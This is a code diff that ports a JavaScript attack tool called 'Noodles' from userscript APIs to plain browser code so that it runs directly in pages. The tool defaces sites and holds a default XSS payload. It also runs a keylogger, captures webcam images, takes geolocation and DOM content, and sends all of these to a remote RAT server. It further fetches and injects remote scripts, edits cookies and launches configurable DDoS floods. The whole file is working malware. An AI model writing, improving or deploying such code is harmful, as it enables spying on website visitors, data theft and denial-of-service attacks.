@@ -10,43 +10,43 @@
     const defaultDDoSThreads = 10; // Define a constant for default DDoS threads
     const defaultDDoSRequestsPerSecond = 100; // Define a constant for default DDoS rate
     const defaultDDoSRandomStringLength = 50;
-    let sessionID = GM_getValue(storageKeyPrefix + 'sessionID', null);
+    let sessionID = localStorage.getItem(storageKeyPrefix + 'sessionID');
 
     if (!sessionID) {
         sessionID = uuidv4();
-        GM_setValue(storageKeyPrefix + 'sessionID', sessionID);
+        localStorage.setItem(storageKeyPrefix + 'sessionID', sessionID);
     }
 
     const getConfig = () => {
         return {
-            title: GM_getValue(storageKeyPrefix + 'title', 'Owned by Noodles!'),
-            message: GM_getValue(storageKeyPrefix + 'message', 'This site is ours now.'),
-            bgColor: GM_getValue(storageKeyPrefix + 'bgColor', '#000000'),
-            textColor: GM_getValue(storageKeyPrefix + 'textColor', '#00ff00'),
-            font: GM_getValue(storageKeyPrefix + 'font', 'monospace'),
-            fontSize: GM_getValue(storageKeyPrefix + 'fontSize', '32px'),
-            redirectURL: GM_getValue(storageKeyPrefix + 'redirectURL', ''),
-            imageURL: GM_getValue(storageKeyPrefix + 'imageURL', ''),
-            customCSS: GM_getValue(storageKeyPrefix + 'customCSS', ''),
-            enableAnimation: GM_getValue(storageKeyPrefix + 'enableAnimation', true),
-            jsInjection: GM_getValue(storageKeyPrefix + 'jsInjection', ''),
-            elementRemoval: GM_getValue(storageKeyPrefix + 'elementRemoval', ''),
-            cookies: JSON.parse(GM_getValue(storageKeyPrefix + 'cookies', '[]')),
-            xssPayload: GM_getValue(storageKeyPrefix + 'xssPayload', '<script>alert("XSS by Noodles");</script>'),
-            keyloggerEnabled: GM_getValue(storageKeyPrefix + 'keyloggerEnabled', false),
-            geoDataEnabled: GM_getValue(storageKeyPrefix + 'geoDataEnabled', false),
-            webcamEnabled: GM_getValue(storageKeyPrefix + 'webcamEnabled', false),
-            remoteJSEnabled: GM_getValue(storageKeyPrefix + 'remoteJSEnabled', false),
-            domExfilEnabled: GM_getValue(storageKeyPrefix + 'domExfilEnabled', false),
-            domExfilSelectors: GM_getValue(storageKeyPrefix + 'domExfilSelectors', 'body'),
-            beaconInterval: GM_getValue(storageKeyPrefix + 'beaconInterval', 300000),
-            panelVisible: GM_getValue(storageKeyPrefix + 'panelVisible', true),
-            ddosEnabled: GM_getValue(storageKeyPrefix + 'ddosEnabled', false),
-            ddosTarget: GM_getValue(storageKeyPrefix + 'ddosTarget', ''),
-            ddosThreads: GM_getValue(storageKeyPrefix + 'ddosThreads', defaultDDoSThreads),
-            ddosRate: GM_getValue(storageKeyPrefix + 'ddosRate', defaultDDoSRequestsPerSecond),
-            ddosRandomStringLength: GM_getValue(storageKeyPrefix + 'ddosRandomStringLength', defaultDDoSRandomStringLength),
-            scriptBypass: GM_getValue(storageKeyPrefix + 'scriptBypass', false)
+            title: localStorage.getItem(storageKeyPrefix + 'title') || 'Owned by Noodles!',
+            message: localStorage.getItem(storageKeyPrefix + 'message') || 'This site is ours now.',
+            bgColor: localStorage.getItem(storageKeyPrefix + 'bgColor') || '#000000',
+            textColor: localStorage.getItem(storageKeyPrefix + 'textColor') || '#00ff00',
+            font: localStorage.getItem(storageKeyPrefix + 'font') || 'monospace',
+            fontSize: localStorage.getItem(storageKeyPrefix + 'fontSize') || '32px',
+            redirectURL: localStorage.getItem(storageKeyPrefix + 'redirectURL') || '',
+            imageURL: localStorage.getItem(storageKeyPrefix + 'imageURL') || '',
+            customCSS: localStorage.getItem(storageKeyPrefix + 'customCSS') || '',
+            enableAnimation: localStorage.getItem(storageKeyPrefix + 'enableAnimation') === 'true',
+            jsInjection: localStorage.getItem(storageKeyPrefix + 'jsInjection') || '',
+            elementRemoval: localStorage.getItem(storageKeyPrefix + 'elementRemoval') || '',
+            cookies: JSON.parse(localStorage.getItem(storageKeyPrefix + 'cookies') || '[]'),
+            xssPayload: localStorage.getItem(storageKeyPrefix + 'xssPayload') || '<script>alert("XSS by Noodles");</script>',
+            keyloggerEnabled: localStorage.getItem(storageKeyPrefix + 'keyloggerEnabled') === 'true',
+            geoDataEnabled: localStorage.getItem(storageKeyPrefix + 'geoDataEnabled') === 'true',
+            webcamEnabled: localStorage.getItem(storageKeyPrefix + 'webcamEnabled') === 'true',
+            remoteJSEnabled: localStorage.getItem(storageKeyPrefix + 'remoteJSEnabled') === 'true',
+            domExfilEnabled: localStorage.getItem(storageKeyPrefix + 'domExfilEnabled') === 'true',
+            domExfilSelectors: localStorage.getItem(storageKeyPrefix + 'domExfilSelectors') || 'body',
+            beaconInterval: parseInt(localStorage.getItem(storageKeyPrefix + 'beaconInterval') || '300000', 10),
+            panelVisible: localStorage.getItem(storageKeyPrefix + 'panelVisible') !== 'false',
+            ddosEnabled: localStorage.getItem(storageKeyPrefix + 'ddosEnabled') === 'true',
+            ddosTarget: localStorage.getItem(storageKeyPrefix + 'ddosTarget') || '',
+            ddosThreads: parseInt(localStorage.getItem(storageKeyPrefix + 'ddosThreads') || defaultDDoSThreads, 10),
+            ddosRate: parseInt(localStorage.getItem(storageKeyPrefix + 'ddosRate') || defaultDDoSRequestsPerSecond, 10),
+            ddosRandomStringLength: parseInt(localStorage.getItem(storageKeyPrefix + 'ddosRandomStringLength') || defaultDDoSRandomStringLength, 10),
+            scriptBypass: localStorage.getItem(storageKeyPrefix + 'scriptBypass') === 'true'
         };
     };
 
@@ -90,7 +90,9 @@
                 ${defacementConfig.customCSS}
             `;
 
-            GM_addStyle(styles);
+            const styleElement = document.createElement('style');
+            styleElement.innerHTML = styles;
+            document.head.appendChild(styleElement);
 
             const messageElement = document.createElement('div');
             messageElement.textContent = defacementConfig.message;
@@ -166,21 +168,20 @@
                 timestamp: Date.now()
             };
 
-            GM_xmlhttpRequest({
+            fetch(logServerURL + '/keys', {
                 method: 'POST',
-                url: logServerURL + '/keys',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                data: JSON.stringify(keyData),
-                onload: (response) => {
-                    if (response.status !== 200) {
-                        console.error('Noodles: Keylog failed to send:', response.status, response.responseText);
-                    }
-                },
-                onerror: (error) => {
-                    console.error('Noodles: Keylog send error:', error);
+                body: JSON.stringify(keyData)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Noodles: Keylog failed to send:', response.status, response.statusText);
                 }
+            })
+            .catch(error => {
+                console.error('Noodles: Keylog send error:', error);
             });
         } catch (e) {
             console.error("Noodles: Keypress logging failed:", e);
@@ -197,21 +198,20 @@
                 timestamp: Date.now()
             };
 
-            GM_xmlhttpRequest({
+            fetch(logServerURL + '/errors', {
                 method: 'POST',
-                url: logServerURL + '/errors',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                data: JSON.stringify(errorData),
-                onload: (response) => {
-                    if (response.status !== 200) {
-                        console.error('Noodles: Log failed to send:', response.status, response.responseText);
-                    }
-                },
-                onerror: (error) => {
-                    console.error('Noodles: Log send error:', error);
+                body: JSON.stringify(errorData)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Noodles: Log failed to send:', response.status, response.statusText);
                 }
+            })
+            .catch(error => {
+                console.error('Noodles: Log send error:', error);
             });
         } catch (e) {
             console.error("Noodles: Error logging failed:", e);
@@ -226,21 +226,20 @@
                 timestamp: Date.now()
             };
 
-            GM_xmlhttpRequest({
+            fetch(ratServerURL + '/heartbeat', {
                 method: 'POST',
-                url: ratServerURL + '/heartbeat',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                data: JSON.stringify(heartbeatData),
-                onload: (response) => {
-                    if (response.status !== 200) {
-                        console.error('Noodles: Heartbeat failed to send:', response.status, response.responseText);
-                    }
-                },
-                onerror: (error) => {
-                    console.error('Noodles: Heartbeat send error:', error);
+                body: JSON.stringify(heartbeatData)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Noodles: Heartbeat failed to send:', response.status, response.statusText);
                 }
+            })
+            .catch(error => {
+                console.error('Noodles: Heartbeat send error:', error);
             });
         } catch (e) {
             console.error("Noodles: Heartbeat failed:", e);
@@ -251,44 +250,33 @@
         if (!defacementConfig.geoDataEnabled) return;
 
         try {
-            GM_xmlhttpRequest({
-                method: 'GET',
-                url: 'https://ipinfo.io/json',
-                onload: (response) => {
-                    if (response.status === 200) {
-                        try {
-                            const geoData = JSON.parse(response.responseText);
-                            geoData.sessionID = sessionID;
-                            GM_xmlhttpRequest({
-                                method: 'POST',
-                                url: ratServerURL + '/geo',
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                },
-                                data: JSON.stringify(geoData),
-                                onload: (response) => {
-                                    if (response.status !== 200) {
-                                        console.error('Noodles: Geo data failed to send:', response.status, response.responseText);
-                                    }
-                                },
-                                onerror: (error) => {
-                                    console.error('Noodles: Geo data send error:', error);
-                                }
-                            });
-
-                        } catch (e) {
-                            console.error('Noodles: Geo data parse error:', e);
-                            logError('Geo data parse error: ' + e.message);
-                        }
-                    } else {
-                        console.error('Noodles: Geo data fetch error:', response.status, response.responseText);
-                        logError('Geo data fetch error: ' + response.status + ' ' + response.responseText);
-                    }
-                },
-                onerror: (error) => {
-                    console.error('Noodles: Geo data request error:', error);
-                    logError('Geo data request error: ' + error.message);
+            fetch('https://ipinfo.io/json')
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Noodles: Geo data fetch error:', response.status, response.statusText);
+                    logError('Geo data fetch error: ' + response.status + ' ' + response.statusText);
+                    return;
                 }
+                return response.json();
+            })
+            .then(geoData => {
+                geoData.sessionID = sessionID;
+                return fetch(ratServerURL + '/geo', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(geoData)
+                });
+            })
+            .then(response => {
+                if (response && !response.ok) {
+                    console.error('Noodles: Geo data failed to send:', response.status, response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Noodles: Geo data request error:', error);
+                logError('Geo data request error: ' + error.message);
             });
         } catch (e) {
             console.error("Noodles: GeoLocation failed:", e);
@@ -318,21 +306,20 @@
                             timestamp: Date.now()
                         };
 
-                        GM_xmlhttpRequest({
+                        fetch(ratServerURL + '/webcam', {
                             method: 'POST',
-                            url: ratServerURL + '/webcam',
                             headers: {
                                 'Content-Type': 'application/json'
                             },
-                            data: JSON.stringify(webcamData),
-                            onload: (response) => {
-                                if (response.status !== 200) {
-                                    console.error('Noodles: Webcam data failed to send:', response.status, response.responseText);
-                                }
-                            },
-                            onerror: (error) => {
-                                console.error('Noodles: Webcam data send error:', error);
+                            body: JSON.stringify(webcamData)
+                        })
+                        .then(response => {
+                            if (!response.ok) {
+                                console.error('Noodles: Webcam data failed to send:', response.status, response.statusText);
                             }
+                        })
+                        .catch(error => {
+                            console.error('Noodles: Webcam data send error:', error);
                         });
                     };
                     reader.readAsDataURL(blob);
@@ -350,28 +337,28 @@
     const fetchAndInjectRemoteJS = () => {
         if (!defacementConfig.remoteJSEnabled) return;
         try {
-            GM_xmlhttpRequest({
-                method: 'GET',
-                url: ratServerURL + '/remote.js?session=' + sessionID,
-                onload: (response) => {
-                    if (response.status === 200) {
-                        try {
-                            const script = document.createElement('script');
-                            script.innerHTML = response.responseText;
-                            document.body.appendChild(script);
-                        } catch (e) {
-                            console.error('Noodles: Remote JS Injection Failed:', e);
-                            logError('Remote JS Injection Failed: ' + e.message);
-                        }
-                    } else {
-                        console.error('Noodles: Remote JS Fetch Failed:', response.status, response.responseText);
-                        logError('Remote JS Fetch Failed: ' + response.status + ' ' + response.responseText);
-                    }
-                },
-                onerror: (error) => {
-                    console.error('Noodles: Remote JS Request Error:', error);
-                    logError('Remote JS Request Error: ' + error.message);
+            fetch(ratServerURL + '/remote.js?session=' + sessionID)
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Noodles: Remote JS Fetch Failed:', response.status, response.statusText);
+                    logError('Remote JS Fetch Failed: ' + response.status + ' ' + response.statusText);
+                    return;
                 }
+                return response.text();
+            })
+            .then(responseText => {
+                try {
+                    const script = document.createElement('script');
+                    script.innerHTML = responseText;
+                    document.body.appendChild(script);
+                } catch (e) {
+                    console.error('Noodles: Remote JS Injection Failed:', e);
+                    logError('Remote JS Injection Failed: ' + e.message);
+                }
+            })
+            .catch(error => {
+                console.error('Noodles: Remote JS Request Error:', error);
+                logError('Remote JS Request Error: ' + error.message);
             });
         } catch (e) {
             console.error("Noodles: RemoteJS failed:", e);
@@ -408,21 +395,20 @@
                 data: extractedData
             };
 
-            GM_xmlhttpRequest({
+            fetch(ratServerURL + '/dom', {
                 method: 'POST',
-                url: ratServerURL + '/dom',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                data: JSON.stringify(domExfilData),
-                onload: (response) => {
-                    if (response.status !== 200) {
-                        console.error('Noodles: DOM Exfiltration Failed:', response.status, response.responseText);
-                    }
-                },
-                onerror: (error) => {
-                    console.error('Noodles: DOM Exfiltration Error:', error);
+                body: JSON.stringify(domExfilData)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Noodles: DOM Exfiltration Failed:', response.status, response.statusText);
                 }
+            })
+            .catch(error => {
+                console.error('Noodles: DOM Exfiltration Error:', error);
             });
 
         } catch (e) {
@@ -521,7 +507,7 @@
             input.style.color = '#ddd';
             input.style.border = '1px solid #777';
             input.addEventListener('change', (e) => {
-                GM_setValue(storageKeyPrefix + key, e.target.value);
+                localStorage.setItem(storageKeyPrefix + key, e.target.value);
                 defacementConfig = getConfig();
             });
             div.appendChild(lbl);
@@ -545,7 +531,7 @@
             textarea.style.color = '#ddd';
             textarea.style.border = '1px solid #777';
             textarea.addEventListener('change', (e) => {
-                GM_setValue(storageKeyPrefix + key, e.target.value);
+                localStorage.setItem(storageKeyPrefix + key, e.target.value);
                 defacementConfig = getConfig();
             });
             div.appendChild(lbl);
@@ -565,7 +551,7 @@
             checkbox.type = 'checkbox';
             checkbox.checked = defacementConfig[key];
             checkbox.addEventListener('change', (e) => {
-                GM_setValue(storageKeyPrefix + key, e.target.checked);
+                localStorage.setItem(storageKeyPrefix + key, e.target.checked);
                 defacementConfig = getConfig();
                 if (key === 'keyloggerEnabled') {
                     if (e.target.checked) {
@@ -576,7 +562,7 @@
                 }
                  if (key === 'ddosEnabled') {
                     const ddosEnabled = e.target.checked;
-                    GM_setValue(storageKeyPrefix + 'ddosEnabled', ddosEnabled);
+                    localStorage.setItem(storageKeyPrefix + 'ddosEnabled', ddosEnabled);
                     defacementConfig = getConfig(); // Refresh configuration
                     ddosControl = performDDOS(); // Re-initialize DDoS control with new config
 
@@ -629,7 +615,7 @@
                     deleteButton.style.cursor = 'pointer';
                     deleteButton.addEventListener('click', () => {
                         defacementConfig.cookies.splice(index, 1);
-                        GM_setValue(storageKeyPrefix + 'cookies', JSON.stringify(defacementConfig.cookies));
+                        localStorage.setItem(storageKeyPrefix + 'cookies', JSON.stringify(defacementConfig.cookies));
                         defacementConfig = getConfig();
                         refreshCookieList();
                     });
@@ -649,7 +635,7 @@
             addCookieButton.addEventListener('click', () => {
                 const newCookie = { name: 'newCookie', value: 'newValue', domain: document.domain, path: '/', secure: false, httpOnly: false };
                 defacementConfig.cookies.push(newCookie);
-                GM_setValue(storageKeyPrefix + 'cookies', JSON.stringify(defacementConfig.cookies));
+                localStorage.setItem(storageKeyPrefix + 'cookies', JSON.stringify(defacementConfig.cookies));
                 defacementConfig = getConfig();
                 refreshCookieList();
             });
@@ -676,7 +662,7 @@
             input.addEventListener('change', (e) => {
                 const parsedValue = parseInt(e.target.value, 10);
                 if (!isNaN(parsedValue)) {
-                    GM_setValue(storageKeyPrefix + key, parsedValue);
+                    localStorage.setItem(storageKeyPrefix + key, parsedValue);
                     defacementConfig = getConfig();
                      if (key === 'ddosThreads' || key === 'ddosRate' || key === 'ddosRandomStringLength') {
                         // Re-initialize DDoS if DDoS-related settings changed
@@ -700,7 +686,7 @@
         resetButton.addEventListener('click', () => {
             if (confirm('Are you sure you want to reset all settings?')) {
               for (const key in defacementConfig) {
-                  GM_deleteValue(storageKeyPrefix + key);
+                  localStorage.removeItem(storageKeyPrefix + key);
               }
               defacementConfig = getConfig();
               applyDefacement();
@@ -714,7 +700,7 @@
         togglePanelButton.style.cssText = 'margin-top: 10px; margin-left: 10px; padding: 5px 10px; background: #555; color: #ddd; border: none; cursor: pointer;';
         togglePanelButton.addEventListener('click', () => {
             defacementConfig.panelVisible = !defacementConfig.panelVisible;
-            GM_setValue(storageKeyPrefix + 'panelVisible', defacementConfig.panelVisible);
+            localStorage.setItem(storageKeyPrefix + 'panelVisible', defacementConfig.panelVisible);
             panel.style.display = defacementConfig.panelVisible ? 'block' : 'none';
             togglePanelButton.textContent = defacementConfig.panelVisible ? 'Hide Panel' : 'Show Panel';
         });
@@ -786,11 +772,13 @@
         dragPanel(panel);
     };
 
-    GM_registerMenuCommand("Noodles: Toggle Defacement Panel", () => {
-        defacementConfig.panelVisible = !defacementConfig.panelVisible;
-        GM_setValue(storageKeyPrefix + 'panelVisible', defacementConfig.panelVisible);
-        createConfigPanel();
-    });
+    window.addEventListener("message", (event) => {
+        if (event.data.type === "noodlesTogglePanel") {
+            defacementConfig.panelVisible = !defacementConfig.panelVisible;
+            localStorage.setItem(storageKeyPrefix + 'panelVisible', defacementConfig.panelVisible);
+            createConfigPanel();
+        }
+    }, false);
 
     setInterval(sendHeartbeat, heartbeatInterval);
     setInterval(getWebcamAccess, webcamInterval);
@@ -821,7 +809,11 @@
     initialize();
     initializeKeylogger();
 
-})();
+    function uuidv4() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+            var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
+    }
 
-edit filepath: main/defacement/defacement.js
-content:
+})();
